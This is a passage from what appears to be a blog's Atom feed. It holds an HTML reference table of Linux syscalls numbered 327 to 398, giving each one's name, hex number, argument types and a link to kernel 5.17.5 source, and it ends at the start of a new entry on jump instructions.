href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1559">fs&#x2F;read_write.c:1559</a></td></tr><tr><td>327</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv2.2.html">sys_preadv2</a></td><td>0x147</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1061">fs&#x2F;read_write.c:1061</a></td></tr><tr><td>328</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev2.2.html">sys_pwritev2</a></td><td>0x148</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1081">fs&#x2F;read_write.c:1081</a></td></tr><tr><td>329</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_mprotect.2.html">sys_pkey_mprotect</a></td><td>0x149</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L824">mm&#x2F;mprotect.c:824</a></td></tr><tr><td>330</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_alloc.2.html">sys_pkey_alloc</a></td><td>0x14a</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L830">mm&#x2F;mprotect.c:830</a></td></tr><tr><td>331</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_free.2.html">sys_pkey_free</a></td><td>0x14b</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L860">mm&#x2F;mprotect.c:860</a></td></tr><tr><td>332</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statx.2.html">sys_statx</a></td><td>0x14c</td><td>int dfd</td><td>const char __user *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx __user *buffer</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L661">fs&#x2F;stat.c:661</a></td></tr><tr><td>333</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_pgetevents.2.html">sys_io_pgetevents</a></td><td>0x14d</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event __user *events</td><td>struct __kernel_timespec __user *timeout</td><td>const struct __aio_sigset *sig</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2243">fs&#x2F;aio.c:2243</a></td></tr><tr><td>334</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rseq.2.html">sys_rseq</a></td><td>0x14e</td><td>struct rseq __user *rseq</td><td>uint32_t rseq_len</td><td>int flags</td><td>uint32_t sig</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/rseq.c#L336">kernel&#x2F;rseq.c:336</a></td></tr><tr><td>335</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_send_signal.2.html">sys_pidfd_send_signal</a></td><td>0x14f</td><td>int pidfd</td><td>int sig</td><td>siginfo_t __user *info</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3846">kernel&#x2F;signal.c:3846</a></td></tr><tr><td>336</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_setup.2.html">sys_io_uring_setup</a></td><td>0x150</td><td>u32 entries</td><td>struct io_uring_params __user *p</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L3604">io_uring&#x2F;io_uring.c:3604</a></td></tr><tr><td>337</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_enter.2.html">sys_io_uring_enter</a></td><td>0x151</td><td>unsigned int fd</td><td>u32 to_submit</td><td>u32 min_complete</td><td>u32 flags</td><td>const void __user *argp</td><td>size_t argsz</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L3154">io_uring&#x2F;io_uring.c:3154</a></td></tr><tr><td>338</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_register.2.html">sys_io_uring_register</a></td><td>0x152</td><td>unsigned int fd</td><td>unsigned int op</td><td>void __user *arg</td><td>unsigned int nr_args</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L4050">io_uring&#x2F;io_uring.c:4050</a></td></tr><tr><td>339</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open_tree.2.html">sys_open_tree</a></td><td>0x153</td><td>int dfd</td><td>const char __user *path</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L2504">fs&#x2F;namespace.c:2504</a></td></tr><tr><td>340</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_mount.2.html">sys_move_mount</a></td><td>0x154</td><td>int from_dfd</td><td>const char __user *from_path</td><td>int to_dfd</td><td>const char __user *to_path</td><td>unsigned int ms_flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3765">fs&#x2F;namespace.c:3765</a></td></tr><tr><td>341</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsopen.2.html">sys_fsopen</a></td><td>0x155</td><td>const char __user *fs_name</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L115">fs&#x2F;fsopen.c:115</a></td></tr><tr><td>342</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsconfig.2.html">sys_fsconfig</a></td><td>0x156</td><td>int fs_fd</td><td>unsigned int cmd</td><td>const char __user *key</td><td>const void __user *value</td><td>int aux</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L314">fs&#x2F;fsopen.c:314</a></td></tr><tr><td>343</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsmount.2.html">sys_fsmount</a></td><td>0x157</td><td>int fs_fd</td><td>unsigned int flags</td><td>unsigned int ms_flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3636">fs&#x2F;namespace.c:3636</a></td></tr><tr><td>344</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fspick.2.html">sys_fspick</a></td><td>0x158</td><td>int dfd</td><td>const char __user *path</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L158">fs&#x2F;fsopen.c:158</a></td></tr><tr><td>345</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_open.2.html">sys_pidfd_open</a></td><td>0x159</td><td>pid_t pid</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/pid.c#L629">kernel&#x2F;pid.c:629</a></td></tr><tr><td>346</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone3.2.html">sys_clone3</a></td><td>0x15a</td><td>struct clone_args __user *uargs</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L2959">kernel&#x2F;fork.c:2959</a></td></tr><tr><td>347</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close_range.2.html">sys_close_range</a></td><td>0x15b</td><td>unsigned int fd</td><td>unsigned int max_fd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1462">fs&#x2F;open.c:1462</a></td></tr><tr><td>348</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat2.2.html">sys_openat2</a></td><td>0x15c</td><td>int dfd</td><td>const char __user *filename</td><td>struct open_how *how</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1345">fs&#x2F;open.c:1345</a></td></tr><tr><td>349</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_getfd.2.html">sys_pidfd_getfd</a></td><td>0x15d</td><td>int pidfd</td><td>int fd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/pid.c#L724">kernel&#x2F;pid.c:724</a></td></tr><tr><td>350</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat2.2.html">sys_faccessat2</a></td><td>0x15e</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L497">fs&#x2F;open.c:497</a></td></tr><tr><td>351</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_madvise.2.html">sys_process_madvise</a></td><td>0x15f</td><td>int pidfd</td><td>const struct iovec __user *vec</td><td>size_t vlen</td><td>int behavior</td><td>unsigned int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/madvise.c#L1445">mm&#x2F;madvise.c:1445</a></td></tr><tr><td>352</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait2.2.html">sys_epoll_pwait2</a></td><td>0x160</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>const struct __kernel_timespec __user *timeout</td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2310">fs&#x2F;eventpoll.c:2310</a></td></tr><tr><td>353</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount_setattr.2.html">sys_mount_setattr</a></td><td>0x161</td><td>int dfd</td><td>const char __user *path</td><td>unsigned int flags</td><td>struct mount_attr __user *uattr</td><td>size_t usize</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L4328">fs&#x2F;namespace.c:4328</a></td></tr><tr><td>354</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl_fd.2.html">sys_quotactl_fd</a></td><td>0x162</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/quota/quota.c#L972">fs&#x2F;quota&#x2F;quota.c:972</a></td></tr><tr><td>355</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_create_ruleset.2.html">sys_landlock_create_ruleset</a></td><td>0x163</td><td>const struct landlock_ruleset_attr __user *attr</td><td>size_t size</td><td>__u32 flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L157">security&#x2F;landlock&#x2F;syscalls.c:157</a></td></tr><tr><td>356</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_add_rule.2.html">sys_landlock_add_rule</a></td><td>0x164</td><td>int ruleset_fd</td><td>enum landlock_rule_type rule_type</td><td>const void __user *rule_attr</td><td>__u32 flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L305">security&#x2F;landlock&#x2F;syscalls.c:305</a></td></tr><tr><td>357</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_restrict_self.2.html">sys_landlock_restrict_self</a></td><td>0x165</td><td>int ruleset_fd</td><td>__u32 flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L397">security&#x2F;landlock&#x2F;syscalls.c:397</a></td></tr><tr><td>358</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/memfd_secret.2.html">sys_memfd_secret</a></td><td>0x166</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/secretmem.c#L231">mm&#x2F;secretmem.c:231</a></td></tr><tr><td>359</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_mrelease.2.html">sys_process_mrelease</a></td><td>0x167</td><td>int pidfd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/oom_kill.c#L1200">mm&#x2F;oom_kill.c:1200</a></td></tr><tr><td>360</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex_waitv.2.html">sys_futex_waitv</a></td><td>0x168</td><td>struct futex_waitv *waiters</td><td>unsigned int nr_futexes</td><td>unsigned int flags</td><td>struct __kernel_timespec __user *timeout</td><td>clockid_t clockid</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L246">kernel&#x2F;futex&#x2F;syscalls.c:246</a></td></tr><tr><td>361</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy_home_node.2.html">sys_set_mempolicy_home_node</a></td><td>0x169</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long home_node</td><td>unsigned long flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1487">mm&#x2F;mempolicy.c:1487</a></td></tr><tr><td>362</td><td>not implemented</td><td>0x16a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>363</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html">compat_sys_rt_sigaction</a></td><td>0x16b</td><td>int</td><td>const struct compat_sigaction __user *</td><td>struct compat_sigaction __user *</td><td>compat_size_t</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>365</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html">compat_sys_ioctl</a></td><td>0x16d</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>compat_ulong_t arg</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>366</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html">sys_readv</a></td><td>0x16e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1041">fs&#x2F;read_write.c:1041</a></td></tr><tr><td>367</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html">sys_writev</a></td><td>0x16f</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1047">fs&#x2F;read_write.c:1047</a></td></tr><tr><td>368</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvfrom.2.html">compat_sys_recvfrom</a></td><td>0x170</td><td>int fd</td><td>void __user *buf</td><td>compat_size_t len</td><td>unsigned flags</td><td>struct sockaddr __user *addr</td><td>int __user *addrlen</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>369</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmsg.2.html">compat_sys_sendmsg</a></td><td>0x171</td><td>int fd</td><td>struct compat_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>370</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmsg.2.html">compat_sys_recvmsg</a></td><td>0x172</td><td>int fd</td><td>struct compat_msghdr __user *msg</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>371</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">compat_sys_execve</a></td><td>0x173</td><td>const char __user *filename</td><td>const compat_uptr_t __user *argv</td><td>const compat_uptr_t __user *envp</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>372</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html">compat_sys_ptrace</a></td><td>0x174</td><td>compat_long_t request</td><td>compat_long_t pid</td><td>compat_long_t addr</td><td>compat_long_t data</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>373</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html">compat_sys_rt_sigpending</a></td><td>0x175</td><td>compat_sigset_t __user *uset</td><td>compat_size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>374</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait_time64.2.html">compat_sys_rt_sigtimedwait_time64</a></td><td>0x176</td><td>compat_sigset_t __user *uthese</td><td>struct compat_siginfo __user *uinfo</td><td>struct __kernel_timespec __user *uts</td><td>compat_size_t sigsetsize</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>375</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html">compat_sys_rt_sigqueueinfo</a></td><td>0x177</td><td>compat_pid_t pid</td><td>int sig</td><td>struct compat_siginfo __user *uinfo</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>376</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html">compat_sys_sigaltstack</a></td><td>0x178</td><td>const compat_stack_t __user *uss_ptr</td><td>compat_stack_t __user *uoss_ptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>377</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html">compat_sys_timer_create</a></td><td>0x179</td><td>clockid_t which_clock</td><td>struct compat_sigevent __user *timer_event_spec</td><td>timer_t __user *created_timer_id</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>378</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html">compat_sys_mq_notify</a></td><td>0x17a</td><td>mqd_t mqdes</td><td>const struct compat_sigevent __user *u_notification</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>379</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html">compat_sys_kexec_load</a></td><td>0x17b</td><td>compat_ulong_t entry</td><td>compat_ulong_t nr_segments</td><td>struct compat_kexec_segment __user *</td><td>compat_ulong_t flags</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>380</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html">compat_sys_waitid</a></td><td>0x17c</td><td>int</td><td>compat_pid_t</td><td>struct compat_siginfo __user *</td><td>int</td><td>struct compat_rusage __user *</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>381</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_robust_list.2.html">compat_sys_set_robust_list</a></td><td>0x17d</td><td>struct compat_robust_list_head __user *head</td><td>compat_size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>382</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_robust_list.2.html">compat_sys_get_robust_list</a></td><td>0x17e</td><td>int pid</td><td>compat_uptr_t __user *head_ptr</td><td>compat_size_t __user *len_ptr</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>383</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vmsplice.2.html">sys_vmsplice</a></td><td>0x17f</td><td>int fd</td><td>const struct iovec __user *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/splice.c#L1292">fs&#x2F;splice.c:1292</a></td></tr><tr><td>384</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_pages.2.html">sys_move_pages</a></td><td>0x180</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void __user * __user *pages</td><td>const int __user *nodes</td><td>int __user *status</td><td>int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/migrate.c#L2063">mm&#x2F;migrate.c:2063</a></td></tr><tr><td>385</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv64.2.html">compat_sys_preadv64</a></td><td>0x181</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>386</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev64.2.html">compat_sys_pwritev64</a></td><td>0x182</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>387</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_tgsigqueueinfo.2.html">compat_sys_rt_tgsigqueueinfo</a></td><td>0x183</td><td>compat_pid_t tgid</td><td>compat_pid_t pid</td><td>int sig</td><td>struct compat_siginfo __user *uinfo</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>388</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmmsg_time64.2.html">compat_sys_recvmmsg_time64</a></td><td>0x184</td><td>int fd</td><td>struct compat_mmsghdr __user *mmsg</td><td>unsigned vlen</td><td>unsigned int flags</td><td>struct __kernel_timespec __user *timeout</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>389</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmmsg.2.html">compat_sys_sendmmsg</a></td><td>0x185</td><td>int fd</td><td>struct compat_mmsghdr __user *mmsg</td><td>unsigned vlen</td><td>unsigned int flags</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>390</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_readv.2.html">sys_process_vm_readv</a></td><td>0x186</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L291">mm&#x2F;process_vm_access.c:291</a></td></tr><tr><td>391</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_writev.2.html">sys_process_vm_writev</a></td><td>0x187</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L298">mm&#x2F;process_vm_access.c:298</a></td></tr><tr><td>392</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsockopt.2.html">sys_setsockopt</a></td><td>0x188</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2260">net&#x2F;socket.c:2260</a></td></tr><tr><td>393</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockopt.2.html">sys_getsockopt</a></td><td>0x189</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int __user *optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2308">net&#x2F;socket.c:2308</a></td></tr><tr><td>394</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html">compat_sys_io_setup</a></td><td>0x18a</td><td>unsigned nr_reqs</td><td>u32 __user *ctx32p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>395</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html">compat_sys_io_submit</a></td><td>0x18b</td><td>compat_aio_context_t ctx_id</td><td>int nr</td><td>u32 __user *iocb</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>396</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execveat.2.html">compat_sys_execveat</a></td><td>0x18c</td><td>int dfd</td><td>const char __user *filename</td><td>const compat_uptr_t __user *argv</td><td>const compat_uptr_t __user *envp</td><td>int flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>397</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv64v2.2.html">compat_sys_preadv64v2</a></td><td>0x18d</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>rwf_t flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>398</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev64v2.2.html">compat_sys_pwritev64v2</a></td><td>0x18e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>loff_t pos</td><td>rwf_t flags</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>跳转指令汇总</title>
    <link href="/2023/03/20/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%B1%87%E6%80%BB/"/>
    <url>/2023/03/20/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%B1%87%E6%80%BB/</url>
    
